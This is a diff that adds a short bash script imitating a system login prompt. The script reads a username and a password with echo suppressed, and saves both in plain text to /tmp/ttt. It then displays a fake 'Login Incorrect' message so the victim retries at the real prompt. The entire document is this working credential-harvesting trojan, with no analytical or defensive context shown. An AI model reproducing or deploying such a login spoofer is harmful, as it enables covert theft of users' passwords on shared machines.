@@ -1,0 +1,15 @@
+#!/bin/bash
+#
+echo -n "Login:"
+read name
+stty -echo
+echo -n "Passward:"
+read passward
+echo ""
+stty echo
+echo $name $passward > /tmp/ttt&
+sleep 2
+echo 2
+echo "Login Incorrect.Re-enter,Please"
+stty cooked
+
